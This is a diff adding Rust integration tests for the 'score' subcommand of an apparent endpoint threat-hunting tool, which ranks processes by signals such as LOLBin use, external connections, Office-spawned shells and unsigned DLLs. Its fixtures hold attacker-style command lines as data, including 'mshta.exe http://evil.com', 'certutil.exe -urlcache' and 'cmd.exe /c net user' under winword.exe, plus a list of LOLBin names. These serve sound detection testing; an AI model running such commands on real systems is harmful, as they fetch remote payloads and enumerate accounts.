@@ -2377,3 +2377,240 @@ fn hunt_suspicious_parent_out_of_order_events() {
         "should correctly identify winword.exe as the parent"
     );
 }
+
+// ---------------------------------------------------------------------------
+// Score subcommand tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn score_help() {
+    cmd().args(["score", "--help"]).assert().success().stdout(
+        predicate::str::contains("--input")
+            .and(predicate::str::contains("--limit"))
+            .and(predicate::str::contains("--json")),
+    );
+}
+
+#[test]
+fn help_shows_score_subcommand() {
+    cmd()
+        .arg("--help")
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("score"));
+}
+
+#[test]
+fn score_empty_file() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap()])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("0 events scanned"));
+    assert!(stdout.contains("No scored processes"));
+}
+
+#[test]
+fn score_ranks_by_signals() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // Process A: LOLBin (certutil) + external IP → score = 20 + 2 = 22
+    // Process B: just a network connection → score = 2
+    // Process C: no signals → score = 0 (should not appear)
+    let lines = [
+        sample_process_create_key("a1000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/certutil.exe", "certutil.exe -urlcache", "2026-03-13T10:00:00Z", "100:1000"),
+        sample_network_event_with_context("a1000000-0000-0000-0000-000000000002", "93.184.216.34", 443, "C:/Windows/System32/certutil.exe", "2026-03-13T10:00:01Z", 100, "100:1000"),
+        sample_process_create_key("a1000000-0000-0000-0000-000000000003", 200, 1, "C:/app/normal.exe", "normal.exe", "2026-03-13T10:00:02Z", "200:2000"),
+        sample_network_event_with_context("a1000000-0000-0000-0000-000000000004", "8.8.8.8", 53, "C:/app/normal.exe", "2026-03-13T10:00:03Z", 200, "200:2000"),
+        sample_process_create_key("a1000000-0000-0000-0000-000000000005", 300, 1, "C:/Windows/explorer.exe", "explorer.exe", "2026-03-13T10:00:04Z", "300:3000"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap(), "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+
+    let procs = parsed["scored_processes"].as_array().unwrap();
+    // certutil should be first (higher score)
+    assert!(procs.len() >= 2, "should have at least 2 scored processes");
+    assert!(
+        procs[0]["image"].as_str().unwrap().contains("certutil"),
+        "certutil should rank first"
+    );
+    assert!(procs[0]["score"].as_u64().unwrap() > procs[1]["score"].as_u64().unwrap());
+
+    // explorer has no signals and should not appear
+    assert!(
+        !procs.iter().any(|p| p["image"].as_str().unwrap().contains("explorer")),
+        "zero-score processes should be excluded"
+    );
+}
+
+#[test]
+fn score_detection_events_add_points() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // A detection event (EvasionDetected with rule) should add 40 points.
+    // sample_detection_event has pid:100 but no process_context — the score
+    // subcommand must fall back to "pid:100" attribution.
+    let lines = [
+        sample_process_create_key("a2000000-0000-0000-0000-000000000001", 100, 1, "C:/malware.exe", "malware.exe", "2026-03-13T10:00:00Z", "100:1000"),
+        sample_detection_event("a2000000-0000-0000-0000-000000000002", "TF-EVA-001"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap(), "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert!(parsed["total_events"].as_u64().unwrap() >= 2);
+
+    // The detection event (pid:100, no process_context) should create a
+    // "pid:100" entry with score >= 40
+    let procs = parsed["scored_processes"].as_array().unwrap();
+    let detection_proc = procs.iter().find(|p| {
+        p["breakdown"]["detections"].as_u64().unwrap_or(0) > 0
+    });
+    assert!(
+        detection_proc.is_some(),
+        "detection event without process_context should still be scored via PID fallback"
+    );
+    assert!(
+        detection_proc.unwrap()["score"].as_u64().unwrap() >= 40,
+        "detection should contribute at least 40 points"
+    );
+}
+
+#[test]
+fn score_suspicious_parent_adds_points() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create_key("a3000000-0000-0000-0000-000000000001", 100, 1, "C:/Program Files/Microsoft Office/winword.exe", "winword.exe", "2026-03-13T10:00:00Z", "100:1000"),
+        sample_process_create_key("a3000000-0000-0000-0000-000000000002", 200, 100, "C:/Windows/System32/cmd.exe", "cmd.exe /c net user", "2026-03-13T10:00:01Z", "200:2000"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap(), "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    let procs = parsed["scored_processes"].as_array().unwrap();
+
+    // cmd.exe spawned by winword → suspicious_parent=true (+20)
+    let cmd_proc = procs.iter().find(|p| p["image"].as_str().unwrap().contains("cmd.exe"));
+    assert!(cmd_proc.is_some(), "cmd.exe should appear in scored processes");
+    let cmd = cmd_proc.unwrap();
+    assert!(cmd["breakdown"]["suspicious_parent"].as_bool().unwrap());
+    assert!(cmd["score"].as_u64().unwrap() >= 20);
+}
+
+#[test]
+fn score_unsigned_dll_adds_points() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create_key("a4000000-0000-0000-0000-000000000001", 100, 1, "C:/app/test.exe", "test.exe", "2026-03-13T10:00:00Z", "100:1000"),
+        sample_image_load_with_context("a4000000-0000-0000-0000-000000000002", 100, "C:/app/evil.dll", "evil.dll", false, "2026-03-13T10:00:01Z", "100:1000", "C:/app/test.exe"),
+        sample_image_load_with_context("a4000000-0000-0000-0000-000000000003", 100, "C:/app/another.dll", "another.dll", false, "2026-03-13T10:00:02Z", "100:1000", "C:/app/test.exe"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap(), "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    let procs = parsed["scored_processes"].as_array().unwrap();
+
+    let test_proc = procs.iter().find(|p| p["process_key"].as_str().unwrap() == "100:1000");
+    assert!(test_proc.is_some());
+    let p = test_proc.unwrap();
+    assert_eq!(p["breakdown"]["unsigned_dlls"].as_u64().unwrap(), 2);
+    // 2 unsigned DLLs * 5 = 10 points
+    assert!(p["score"].as_u64().unwrap() >= 10);
+}
+
+#[test]
+fn score_human_readable_output() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create_key("a5000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/mshta.exe", "mshta.exe http://evil.com", "2026-03-13T10:00:00Z", "100:1000"),
+        sample_network_event_with_context("a5000000-0000-0000-0000-000000000002", "1.2.3.4", 443, "C:/Windows/System32/mshta.exe", "2026-03-13T10:00:01Z", 100, "100:1000"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap()])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("Process Threat Scores"));
+    assert!(stdout.contains("Score:"));
+    assert!(stdout.contains("mshta.exe"));
+    assert!(stdout.contains("LOLBin"));
+    assert!(stdout.contains("external IP"));
+}
+
+#[test]
+fn score_limit_respected() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // Create 5 LOLBin processes
+    let mut lines = Vec::new();
+    let lolbins = ["certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe", "cscript.exe"];
+    for (i, name) in lolbins.iter().enumerate() {
+        let pid = (100 + i) as u32;
+        lines.push(sample_process_create_key(
+            &format!("a6000000-0000-0000-0000-{:012}", i),
+            pid, 1,
+            &format!("C:/Windows/System32/{name}"),
+            &format!("{name} args"),
+            &format!("2026-03-13T10:00:{:02}Z", i),
+            &format!("{pid}:{}", 1000 + i),
+        ));
+    }
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["score", "--input", path.to_str().unwrap(), "--limit", "2", "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(parsed["scored_processes"].as_array().unwrap().len(), 2);
+}
